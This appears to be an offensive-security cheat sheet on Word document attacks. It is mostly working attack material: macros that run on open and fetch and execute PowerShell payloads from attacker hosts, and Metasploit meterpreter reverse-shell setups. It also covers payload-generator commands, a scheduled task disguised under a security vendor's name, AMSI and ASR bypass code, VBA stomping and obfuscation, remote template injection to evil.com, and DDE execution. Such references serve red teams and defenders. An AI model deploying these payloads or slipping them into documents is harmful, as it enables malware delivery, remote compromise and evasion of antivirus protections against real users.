<!-- provenance: InternalAllTheThings docs/redteam/access/office-attacks.md @ 203bb0c | part 2/3: Office Attacks - Word | converted for Agent Skills; see ../../NOTICE.md -->

# Office Attacks - Word

## Word

### DOCM - Metasploit

```ps1
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 80
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME Financial2021.docm
exploit -j
```

### DOCM - Download and Execute

> Detected by Defender (AMSI)

```ps1
Sub Execute()
Dim payload
payload = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');"
Call Shell(payload, vbHide)
End Sub
Sub Document_Open()
Execute
End Sub
```

### DOCM - Macro Creator

* [Arno0x/PowerShellScripts/MacroCreator](https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator)

```ps1
# Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
# Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```

### DOCM - C# converted to Office VBA macro

> A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.

* [trustedsec/unicorn](https://github.com/trustedsec/unicorn)

```ps1
python unicorn.py payload.cs cs macro
```

### DOCM - VBA Wscript

```ps1
Sub parent_change()
    Dim objOL
    Set objOL = CreateObject("Outlook.Application")
    Set shellObj = objOL.CreateObject("Wscript.Shell")
    shellObj.Run("notepad.exe")
End Sub
Sub AutoOpen()
    parent_change
End Sub
Sub Auto_Open()
    parent_change
End Sub
```

```vb
CreateObject("WScript.Shell").Run "calc.exe"
CreateObject("WScript.Shell").Exec "notepad.exe"
```

### DOCM - VBA Shell Execute Comment

Set your command payload inside the **Comment** metadata of the document.

```vb
Sub beautifulcomment()
    Dim p As DocumentProperty
    For Each p In ActiveDocument.BuiltInDocumentProperties
        If p.Name = "Comments" Then
            Shell (p.Value)
        End If
    Next
End Sub

Sub AutoExec()
    beautifulcomment
End Sub

Sub AutoOpen()
    beautifulcomment
End Sub
```

### DOCM - VBA Spawning via svchost.exe using Scheduled Task

```vb
Sub AutoOpen()
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim td: Set td = service.NewTask(0)
    td.RegistrationInfo.Author = "Kaspersky Corporation"
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim triggers: Set triggers = td.triggers
    Dim trigger: Set trigger = triggers.Create(1)
    Dim startTime: ts = DateAdd("s", 30, Now)
    startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
    trigger.StartBoundary = startTime
    trigger.ID = "TimeTriggerId"
    Dim Action: Set Action = td.Actions.Create(0)
    Action.Path = "C:\Windows\System32\powershell.exe"
    Action.Arguments = "-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
    Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
End Sub
Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
```

### DOCM - WMI COM functions

Basic WMI exec (detected by Defender) : `r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)`

```vb
Sub wmi_exec()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
    Set objProc = objWMIService.Get("Win32_Process")
    Set procStartConfig = objStartUp.SpawnInstance_
    procStartConfig.ShowWindow = 1
    objProc.Create "powershell.exe", Null, procStartConfig, intProcessID
End Sub
```

* [infosecn1nja/ASR Rules Bypass.vba](https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3)
* <https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2>

```vb
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')", Null, objConfig, intProcessID
End Sub

Sub AutoExec()
    ASR_bypass_create_child_process_rule5
End Sub

Sub AutoOpen()
    ASR_bypass_create_child_process_rule5
End Sub
```

```vb
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

### DOCM/XLM - Macro Pack - Macro and DDE

> Only the community version is available online.

* [sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)

```powershell
# Options
-G, --generate=OUTPUT_FILE_PATH. Generates a file. 
-t, --template=TEMPLATE_NAME    Use code template already included in MacroPack
-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)

# Execute a command
echo "calc.exe" | macro_pack.exe -t CMD -G cmd.xsl

# Download and execute a file
echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -G dropper.xls

# Meterpreter reverse TCP template using MacroMeter by Cn33liz
echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm

# Drop and execute embedded file
macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs

# Obfuscate the vba file generated by msfvenom and put result in a new vba file.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

# Obfuscate Empire stager vba file and generate a MS Word document:
macro_pack.exe -f empire.vba -o -G myDoc.docm

# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm" 

# Execute calc.exe via Dynamic Data Exchange (DDE) attack
echo calc.exe | macro_pack.exe --dde -G calc.xslx

# Download and execute file via powershell using Dynamic Data Exchange (DDE) attack
macro_pack.exe --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.xsl

# PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).
msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm

# PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm

# PRO: Generate an HTA payload able to run a shellcode via Excel injection
echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples\nicepic.hta
echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk

# PRO: XLM Injection
echo "MPPro" | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel

# PRO: ShellCode Exec - Heap Injection, AlternativeInjection
echo "x32calc.bin" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc
echo "x32calc.bin" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc

# PRO: More shellcodes
echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive
echo "x86.bin" "x64.bin" | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bin" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
```

### DOCM - BadAssMacros

> C# based automated Malicous Macro Generator.

* [Inf0secRabbit/BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)

```powershell
BadAssMacros.exe -h

# Create VBA for classic shellcode injection from raw shellcode
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c 23 -o .\Desktop\output.txt

# Create VBA for indirect shellcode injection from raw shellcode
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>

# List modules inside Doc/Excel file
BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l

# Purge Doc/Excel file
BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>
```

### DOCM - CACTUSTORCH VBA Module

> CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript

* [mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
* [tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
* [CACTUSTORCH - DotNetToJScript all the things](https://youtu.be/YiaKb8nHFSY)
* [CACTUSTORCH - CobaltStrike Aggressor Script Addon](https://www.youtube.com/watch?v=_pwH6a-6yAQ)

1. Import **.cna** in Cobalt Strike
2. Generate a new VBA payload from the CACTUSTORCH menu
3. Download DotNetToJscript
4. Compile it
    * **DotNetToJscript.exe** - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript
    * **ExampleAssembly.dll** - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text "test"
5. Execute **DotNetToJscript.exe** and supply it with the ExampleAssembly.dll, specify the output file and the output type

    ```ps1
    DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch
    ```

6. Use the generated code to replace the hardcoded binary in CactusTorch

### DOCM - MMG with Custom DL + Exec

1. Custom Download in first Macro to "C:\\Users\\Public\\beacon.exe"
2. Create a custom binary execute using MMG
3. Merge both Macro

```ps1
git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
python MMG.py configs/generic-cmd.json malicious.vba
{
 "description": "Generic command exec payload\nEvasion technique set to none",
 "template": "templates/payloads/generic-cmd-template.vba",
 "varcount": 152,
 "encodingoffset": 5,
 "chunksize": 180,
 "encodedvars":  {},
 "vars":  [],
 "evasion":  ["encoder"],
 "payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
}
```

```vb
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
    On Error GoTo Failed
    DownloadFileA = False
    'As directory must exist, this is a check
    If CreateObject("Scripting.FileSystemObject").FolderExists(CreateObject("Scripting.FileSystemObject").GetParentFolderName(DownloadPath)) = False Then Exit Function
    Dim returnValue As Long
    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)
    'If return value is 0 and the file exist, then it is considered as downloaded correctly
    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) > 0)
    Exit Function

Failed:
End Function

Sub AutoOpen()
    DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
End Sub


Sub Auto_Open()
    DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
End Sub
```

### DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro

Go to **Developer tab** on ribbon `-> Insert -> More Controls -> Microsoft InkPicture Control`

```vb
Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
End Sub
```

### VBA Obfuscation

* [bonnetn/vba-obfuscator](https://github.com/bonnetn/vba-obfuscator) [Youtube demo](https://www.youtube.com/watch?v=L0DlPOLx2k0)

    ```ps1
    cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
    ```

* [trustedsec/The_Shelf/spinningteacup](https://github.com/trustedsec/The_Shelf/tree/main/Retired/spinningteacup)

### VBA Purging

**VBA Stomping**: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code.

:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.

#### OfficePurge

* [fireeye/OfficePurge](https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe)

```powershell
OfficePurge.exe -d word -f .\malicious.doc -m NewMacros
OfficePurge.exe -d excel -f .\payroll.xls -m Module1
OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument
OfficePurge.exe -d word -f .\malicious.doc -l
```

#### EvilClippy

> Evil Clippy uses the OpenMCDF library to manipulate CFBF files.
> Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
> If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.

```ps1
# OSX/Linux
mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
# Windows
csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 

EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc

# make macro code unaccessible is to mark the project as locked and unviewable: -u
# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.
EvilClippy.exe -r macrofile.doc
```

### VBA - Offensive Security Template

* Reverse Shell VBA - [JohnWoodman/VBA-Macro-Reverse-Shell/VBA-Reverse-Shell.vba](https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba)
* Process Dumper - [JohnWoodman/VBA-Macro-Dump-Process](https://github.com/JohnWoodman/VBA-Macro-Dump-Process)
* RunPE - [itm4n/VBA-RunPE](https://github.com/itm4n/VBA-RunPE)
* Spoof Parent - [py7hagoras/OfficeMacro64](https://github.com/py7hagoras/OfficeMacro64)
* AMSI Bypass - [outflanknl/AMSIbypasses.vba](https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba)
* amsiByPassWithRTLMoveMemory - [DanShaqFu/amsiByPassWithRTLMoveMemory.vba](https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3)
* VBA macro spawning a process with a spoofed parent - [christophetd/spoofing-office-macro/macro64.vba](https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba)

### VBA - AMSI

> The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. [Office VBA + AMSI: Parting the veil on malicious macros by Microsoft Security Team](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)

![runtime-scanning-amsi](https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png)

:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).

The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro

* AMSI Trigger - [synacktiv/AMSI-Bypass](https://github.com/synacktiv/AMSI-Bypass)

```vb
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
 
Private Sub Document_Open()
    Dim AmsiDLL As LongPtr
    Dim AmsiScanBufferAddr As LongPtr
    Dim result As Long
    Dim MyByteArray(6) As Byte
    Dim ArrayPointer As LongPtr
 
    MyByteArray(0) = 184 ' 0xB8
    MyByteArray(1) = 87  ' 0x57
    MyByteArray(2) = 0   ' 0x00
    MyByteArray(3) = 7   ' 0x07
    MyByteArray(4) = 128 ' 0x80
    MyByteArray(5) = 195 ' 0xC3
 
    AmsiDLL = LoadLibrary("amsi.dll")
    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
    ArrayPointer = VarPtr(MyByteArray(0))
    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
     
End Sub
```

### DOCX - Template Injection

:warning: Does not require "Enable Macro"

#### Remote Template

1. A malicious macro is saved in a Word template .dotm file
2. Benign .docx file is created based on one of the default MS Word Document templates
3. Document from step 2 is saved as .docx
4. Document from step 3 is renamed to .zip
5. Document from step 4 gets unzipped
6. **.\word_rels\settings.xml.rels** contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).

    ```xml
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/></Relationships>
    ```

    ```xml
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>
    ```

7. File gets zipped back up again and renamed to .docx

#### Template Injections Tools

* [JohnWoodman/remoteInjector](https://github.com/JohnWoodman/remoteInjector)
* [ryhanson/phishery](https://github.com/ryhanson/phishery)

```ps1
$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
[+] Opening Word document: good.docx
[+] Setting Word document template to: https://secure.site.local/docs
[+] Saving injected Word document to: bad.docx
[*] Injected Word document has been saved!
```

### DOCX - DDE

* Insert > QuickPart > Field
* Right Click > Toggle Field Code
* `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`
